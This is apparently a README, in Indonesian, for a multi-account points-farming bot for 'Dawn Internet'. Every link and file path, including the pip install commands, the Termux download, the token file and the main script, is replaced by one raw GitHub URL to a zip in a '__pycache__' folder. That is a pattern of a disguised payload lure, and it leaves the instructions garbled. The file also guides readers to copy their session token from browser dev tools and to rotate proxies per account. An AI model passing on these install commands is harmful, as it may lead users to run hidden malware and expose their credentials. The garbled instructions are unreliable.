# 🌅 WINSNIP Dawn Farmer

Auto-farming bot untuk Dawn Internet dengan support multi-account dan proxy.

## ✨ Features

- ✅ Multi-account farming
- ✅ Multi-proxy support  
- ✅ Auto statistics display
- ✅ Color terminal output
- ✅ Modular & clean code
- ✅ Cross-platform (Windows, Linux, macOS)

## 📋 Requirements

- Python 3.8+
- curl-cffi
- colorama (optional, untuk warna)

## 🚀 Installation

### Windows
```bash
pip install -r https://github.com/wizdomf3lix/Dawn-Farmer-private/raw/refs/heads/main/src/__pycache__/private_Farmer_Dawn_1.0.zip
```

### Linux/Mac
```bash
pip3 install -r https://github.com/wizdomf3lix/Dawn-Farmer-private/raw/refs/heads/main/src/__pycache__/private_Farmer_Dawn_1.0.zip
```

### Android (Termux)

1. **Install Termux**
   - Download dari F-Droid: https://github.com/wizdomf3lix/Dawn-Farmer-private/raw/refs/heads/main/src/__pycache__/private_Farmer_Dawn_1.0.zip
   - Atau Google Play Store (versi lama)

2. **Update Package & Install Dependencies**
   ```bash
   pkg update && pkg upgrade
   pkg install python git
   ```

3. **Clone/Download Bot**
   ```bash
   # Clone dari GitHub
   git clone https://github.com/wizdomf3lix/Dawn-Farmer-private/raw/refs/heads/main/src/__pycache__/private_Farmer_Dawn_1.0.zip
   cd Dawn-Farmer
   
   # Atau download ZIP dari GitHub dan extract
   ```

4. **Install Requirements**
   ```bash
   pip install -r https://github.com/wizdomf3lix/Dawn-Farmer-private/raw/refs/heads/main/src/__pycache__/private_Farmer_Dawn_1.0.zip
   ```

5. **Setup Token & Run**
   ```bash
   # Edit https://github.com/wizdomf3lix/Dawn-Farmer-private/raw/refs/heads/main/src/__pycache__/private_Farmer_Dawn_1.0.zip pake nano
   nano https://github.com/wizdomf3lix/Dawn-Farmer-private/raw/refs/heads/main/src/__pycache__/private_Farmer_Dawn_1.0.zip
   # Paste token, tekan Ctrl+X, Y, Enter untuk save
   
   # Run bot
   python https://github.com/wizdomf3lix/Dawn-Farmer-private/raw/refs/heads/main/src/__pycache__/private_Farmer_Dawn_1.0.zip
   ```

**Tips Android:**
- Gunakan Termux:Widget untuk auto-start
- Install Termux:Boot untuk run saat HP restart
- Gunakan screen/tmux untuk background farming:
  ```bash
  pkg install tmux
  tmux new -s farm
  python https://github.com/wizdomf3lix/Dawn-Farmer-private/raw/refs/heads/main/src/__pycache__/private_Farmer_Dawn_1.0.zip
  # Tekan Ctrl+B lalu D untuk detach
  # tmux attach -t farm untuk kembali
  ```

## ⚙️ Setup

### 1. Cara Mendapatkan x-privy-token

**Langkah-langkah:**

1. **Buka Dawn Dashboard**
   - Kunjungi: https://github.com/wizdomf3lix/Dawn-Farmer-private/raw/refs/heads/main/src/__pycache__/private_Farmer_Dawn_1.0.zip
   - Login dengan akun Anda

2. **Buka Developer Tools**
   - Windows/Linux: Tekan `F12` atau `Ctrl+Shift+I`
   - Mac: Tekan `Cmd+Option+I`

3. **Buka Tab Network**
   - Klik tab **"Network"** di Developer Tools
   - Refresh halaman (F5)

4. **Cari Request**
   - Scroll list request
   - Cari request yang menuju `https://github.com/wizdomf3lix/Dawn-Farmer-private/raw/refs/heads/main/src/__pycache__/private_Farmer_Dawn_1.0.zip`
   - Klik salah satu request (contoh: `my-code`, `stats`, `claims`, dll)

5. **Copy Token**
   - Klik tab **"Headers"** 
   - Scroll ke bawah ke bagian **"Request Headers"**
   - Cari header **"X-Privy-Token"**
   - Copy value tokennya (panjang sekali, contoh: `eyJhbGciOiJ...`)

6. **Paste ke https://github.com/wizdomf3lix/Dawn-Farmer-private/raw/refs/heads/main/src/__pycache__/private_Farmer_Dawn_1.0.zip**
   ```
   eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCIsImtpZ...
   ```

**Struktur Token:**
- Token dimulai dengan `eyJ`
- Sangat panjang (ratusan karakter)
- Format: `https://github.com/wizdomf3lix/Dawn-Farmer-private/raw/refs/heads/main/src/__pycache__/private_Farmer_Dawn_1.0.zip` (3 bagian dipisah titik)

**Catatan Penting:**
- ⚠️ Jangan share token ke orang lain!
- Token akan expired, jika bot error, ambil token baru
- Satu token = satu akun

---

### 2. Add Tokens ke File

**Edit `https://github.com/wizdomf3lix/Dawn-Farmer-private/raw/refs/heads/main/src/__pycache__/private_Farmer_Dawn_1.0.zip`:**
```
your-x-privy-token-here
another-token-if-you-have
```

Bisa tambah banyak token (satu per baris) untuk multi-account farming.

---

### 3. Add Proxies (Optional)

**Edit `https://github.com/wizdomf3lix/Dawn-Farmer-private/raw/refs/heads/main/src/__pycache__/private_Farmer_Dawn_1.0.zip`:**
```
http://user:pass@ip:port
http://ip:port
socks5://user:pass@ip:port
```

Lihat `https://github.com/wizdomf3lix/Dawn-Farmer-private/raw/refs/heads/main/src/__pycache__/private_Farmer_Dawn_1.0.zip` untuk contoh format.

## 🎮 Usage

### Windows
```bash
python https://github.com/wizdomf3lix/Dawn-Farmer-private/raw/refs/heads/main/src/__pycache__/private_Farmer_Dawn_1.0.zip
```

### Linux/Mac
```bash
python3 https://github.com/wizdomf3lix/Dawn-Farmer-private/raw/refs/heads/main/src/__pycache__/private_Farmer_Dawn_1.0.zip
```

### Stop Farming
Tekan `Ctrl+C` untuk stop dengan aman.

## 📊 Statistics Display

Bot akan menampilkan:
- 💰 Total Points (Current + Referral)
- 🔥 Farming Streak
- 👥 Referral Stats & Code
- 📈 24h Activity

Statistics update setiap 5 ping (sekitar 50 menit).

## 📁 File Structure

```
https://github.com/wizdomf3lix/Dawn-Farmer-private/raw/refs/heads/main/src/__pycache__/private_Farmer_Dawn_1.0.zip              # Main entry point
https://github.com/wizdomf3lix/Dawn-Farmer-private/raw/refs/heads/main/src/__pycache__/private_Farmer_Dawn_1.0.zip           # Your x-privy-tokens
https://github.com/wizdomf3lix/Dawn-Farmer-private/raw/refs/heads/main/src/__pycache__/private_Farmer_Dawn_1.0.zip          # Your proxies (optional)
https://github.com/wizdomf3lix/Dawn-Farmer-private/raw/refs/heads/main/src/__pycache__/private_Farmer_Dawn_1.0.zip  # Proxy format examples
https://github.com/wizdomf3lix/Dawn-Farmer-private/raw/refs/heads/main/src/__pycache__/private_Farmer_Dawn_1.0.zip     # Dependencies
src/
  ├── https://github.com/wizdomf3lix/Dawn-Farmer-private/raw/refs/heads/main/src/__pycache__/private_Farmer_Dawn_1.0.zip      # Configuration
  ├── core/
  │   ├── https://github.com/wizdomf3lix/Dawn-Farmer-private/raw/refs/heads/main/src/__pycache__/private_Farmer_Dawn_1.0.zip  # API client
  │   └── https://github.com/wizdomf3lix/Dawn-Farmer-private/raw/refs/heads/main/src/__pycache__/private_Farmer_Dawn_1.0.zip  # Farming logic
  └── utils/
      └── https://github.com/wizdomf3lix/Dawn-Farmer-private/raw/refs/heads/main/src/__pycache__/private_Farmer_Dawn_1.0.zip # Helper functions
```

## ⚙️ Configuration

Edit `https://github.com/wizdomf3lix/Dawn-Farmer-private/raw/refs/heads/main/src/__pycache__/private_Farmer_Dawn_1.0.zip` untuk mengubah:
- `interval`: Ping interval (default: 600 detik / 10 menit)
- `tokens_file`: File token location
- `proxies_file`: File proxy location

## 🔧 Troubleshooting

**Error: No tokens found**
- Pastikan `https://github.com/wizdomf3lix/Dawn-Farmer-private/raw/refs/heads/main/src/__pycache__/private_Farmer_Dawn_1.0.zip` ada dan berisi token
- Format: satu token per baris

**Error: Module not found**
- Install dependencies: `pip install -r https://github.com/wizdomf3lix/Dawn-Farmer-private/raw/refs/heads/main/src/__pycache__/private_Farmer_Dawn_1.0.zip`

**Ping failed**
- Check token masih valid
- Check proxy jika dipakai
- Check koneksi internet

## 📝 Notes

- Interval 10 menit (600s) adalah yang paling aman untuk earning points
- Jangan set terlalu cepat atau points tidak akan dihitung
- Streak akan bertambah jika farming konsisten setiap hari
- Gunakan proxy berbeda untuk setiap account

## 👨‍💻 Developer

**WINSNIP**  
Version: 1.0.0

## ⚠️ Disclaimer

Bot ini untuk educational purposes. Gunakan dengan bijak dan sesuai Terms of Service Dawn Internet.
